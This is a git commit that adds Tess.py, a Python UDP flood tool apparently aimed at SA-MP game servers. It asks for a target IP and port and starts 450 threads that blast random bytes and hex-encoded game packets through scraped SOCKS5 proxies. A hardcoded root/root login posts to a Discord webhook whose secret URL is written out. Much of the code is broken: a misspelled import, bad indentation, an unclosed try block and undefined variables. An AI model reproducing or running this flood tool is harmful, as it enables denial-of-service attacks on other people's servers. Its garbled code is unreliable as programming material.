651ee9773d6fbd1280cda91b6d261cc2a1185a27
typicalgoods122228 <109500807+typicalgoods122228@users.noreply.github.com>
2022-09-06 23:04:12 +0700

    Create Tess.py

---
+++ Tess.py
@@ -0,0 +1,255 @@
+import socket, struct, codecs, sys, threading, random, time, os, discrd;from discord import webhook
+
+username1 = "root"
+password1 = "root"
+username = str(input("\033[93mUsername:"))
+password = str(input("\033[93mPassword:"))
+if password == f"{password1}" and username == f"{username1}":
+    print (f"Connect As {username}")
+    time.sleep(2)
+
+else:
+    print (f"The password you entered is wrong Password You Input: {password}")
+    exit()
+
+os.system("clear")
+embed = [f"```Username: {username}
+Owner Tools: Araapp```"]
+Webhook_url = "https://discord.com/api/webhooks/1009724270479421461/7AW-Kw2HmTV3tXa0EhJSBDu9Tf1Ff5MVJCRU1erhR_lskpc-4s9Q1syYqgqcFc_tor2-"
+def on_connect():
+    print(f"Connected")
+    #if exaultsnukers.user.id != 899720970242252801:
+      #ip = requests.get('https://api.ipify.org/').text
+      data = {
+          "content": embed,
+          "username" : "LOGS LOGIN",
+          "avatar_url" : "https://media.discordapp.net/attachments/1009724217387917345/1009730054776950804/0ae4c5783d70fd7a0f52d9f8c2dafcd0.jpg"
+            }
+     try:
+          requests.post(Webhook_url, json=data)
+os.system("clear")
+Pacotes = [
+ codecs.decode('53414d5090d91d4d611e700a465b00', 'hex_codec'),
+ codecs.decode('53414d509538e1a9611e63', 'hex_codec'),
+ codecs.decode('53414d509538e1a9611e69', 'hex_codec'),
+ codecs.decode('53414d509538e1a9611e72', 'hex_codec'),
+ codecs.decode('081e62da', 'hex_codec'),
+ codecs.decode('081e77da', 'hex_codec'),
+ codecs.decode('081e4dda', 'hex_codec'),
+ codecs.decode('021efd40', 'hex_codec'),
+ codecs.decode('081e7eda', 'hex_codec')]
+
+
+referers = [
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC'
+     'Your_Server_Bypassed_By_WIZZSEC'
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC',
+     'Your_Server_Bypassed_By_WIZZSEC'
+     'Your_Server_Bypassed_By_WIZZSEC']
+
+refers = [
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC'
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC',
+     'SERVER_BYPASSED_WIZZSEC']
+
+ip = str(input("\033[91mInput Ip: "))
+port = int(input("\033[91mInput Port: "))
+method = str(input("\033[91mInput Method UDP: "))
+threads = str(input("\033[91mInput Threads: "))
+proxy = str(input("\033[91mInput Proxy HTTP/SOCKS5: "))
+orgip = ip
+os.system("clear")
+times = (random.randint(672,788))
+print(f"\033[91m ╔═══════════════════════════╗")
+print(f"\033[91m ║    TOOLS EXAULTS GENERATION    ║")
+print(f"\033[91m ║ Attacked Ip  : \033[0m{ip}     ║")
+print(f"\033[91m ║ Attacked Port: \033[0m{port}   ║")
+print(f"\033[91m ║ Methods      : \033[0m{methods}║")
+print(f"\033[91m ║ Time         : \033[0m{times}  ║")
+print(f"\033[91m ║ Socks/Proxy  : \033[91m{proxy} ║")
+print(f"\033[91m ╚═══════════════════════════╝")
+print("\033[96m╔══════════════════════════════╗")
+print("\033[96m║      Exaults Generation OnTop     ║")
+print("\033[96m╚══════════════════════════════╝")
+payload = b"\x00\x02\x00\x2f"
+
+proxyResources = [
+    'https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=10000&country=all',
+    'https://www.proxy-list.download/api/v1/get?type=socks5',
+    'https://www.proxyscan.io/download?type=socks5',
+    'https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt',
+]
+socksFile= "socks5.txt"
+#GET SOCKS
+def socksCrawler():
+    global socksFile, socksResources
+    f = open(socksFile,'wb')
+    for url in proxyResources:
+        try:
+            f.write(requests.get(url).content)
+        except:
+            pass
+    f.close()
+
+def randomip():
+  randip = []
+  randip1 = random.randint(1,255)
+  randip2 = random.randint(1,255)
+  randip3 = random.randint(1,255)
+  randip4 = random.randint(1,255)
+  randip5 = random.randint(1,255)
+  randip6 = random.randint(1,255)
+  randip7 = random.randint(1,255)
+  randip8 = random.randint(1,255)
+  
+  randip.append(randip1)
+  randip.append(randip2)
+  randip.append(randip3)
+  randip.append(randip4)
+  randip.append(randip5)
+  randip.append(randip6)
+  randip.append(randip7)
+  randip.append(randip8)
+
+  randip = str(randip[0]) + "." + str(randip[1]) + "." + str(randip[2]) + "." + str(randip[3])
+  return(randip)
+
+def spoofer():
+    addr = [192, 168, 0, 1]
+    d = '.'
+    addr[0] = str(random.randrange(11, 197))
+    addr[1] = str(random.randrange(0, 255))
+    addr[2] = str(random.randrange(0, 255))
+    addr[3] = str(random.randrange(2, 254))
+    addr[4] = str(random.randrange(2, 256))
+    addr[5] = str(random.randrange(2, 254))
+    addr[6] = str(random.randrange(2, 256))
+    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3] + d + addr[4] + d + addr[5] + d + addr[6]
+    return assemebled
+
+def getproxy():
+    global proxies
+    f = open(f'{socks5}.txt','wb')
+    r = requests.get(urlproxy)
+    f.write(r.content)
+    f.close()
+    proxies = open(f'{socks5}.txt').readlines()
+
+def proxyask():
+    global urlproxy
+    pro = input(f'[~] Get New List {http} [Y] : ')
+    if pro == "Y":
+        urlproxy = "https://www.proxy-list.download/api/v1/get?type=socks5"
+        urlproxy = "https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=5000&country=all&ssl=yes&anonymity=all"
+        getproxy()
+        askthreads()
+    else:
+        proxyask()  
+
+class MyThread(threading.Thread):
+
+    def run(self):
+          prox = open("./socks5.txt", 'r').read().split('\n')
+            proxy = random.choice(prox).strip().split(":")
+        while True:
+            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+            bytes = random._urandom(1024)
+            pack = random._urandom(666)
+            nitro = os.urandom(1025,888,120,547,558,65500, bytes, threads)
+            msg = Pacotes[random.randrange(0, 1)]
+            sock.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
+            sock.sendto(bytes, (ip, int(port)))
+            sock.sendto(payload, (ip, int(port)))
+            sock.sendto(pack, (ip, int(port)))
+            sock.sendto(msg, (ip, int(port)))
+            if int(port) == 7777:
+                sock.sendto(Pacotes[5], (ip, int(port)))
+            elif int(port) == 7780:
+                sock.sendto(Pacotes[4], (ip, int(port)))
+            elif int(port) == 2021:
+                sock.sendto(Pacotes[6], (ip, int(port)))
+            elif int(port) == 2022:
+                sock.sendto(Pacotes[3], (ip, int(port)))
+            elif int(port) == 7772:
+                sock.sendto(Pacotes[7], (ip, int(port)))
+            elif int(port) == 7771:
+                sock.sendto(Pacotes[8], (ip, int(port)))
+                
+if __name__ == '__main__':
+    try:
+        for x in range(450):
+            mythread = MyThread()
+            mythread.start()
+            time.sleep(.1)
+
+    except KeyboardInterrupt:
+        os.system('cls' if os.name == 'nt' else 'clear')
+        print ("╔════════════════════════════════════╗")
+        print ("         ╔═╗╔╦╗╔═╗╔═╗╔═╗╔═╗╔╦╗        ")
+        print ("         ╚═╗ ║ ║ ║╠═╝╠═╝║╣  ║║        ")
+        print ("         ╚═╝ ╩ ╚═╝╩  ╩  ╚═╝═╩╝        ")
+        print ("╚════════════════════════════════════╝")
+        print ('\n\n')
+        print ('STOP TO ATTACK {}').format(orgip)
+#***************#
+#  AUTHOR       #
+#  SAMP EXPLOIT #
+#***************#
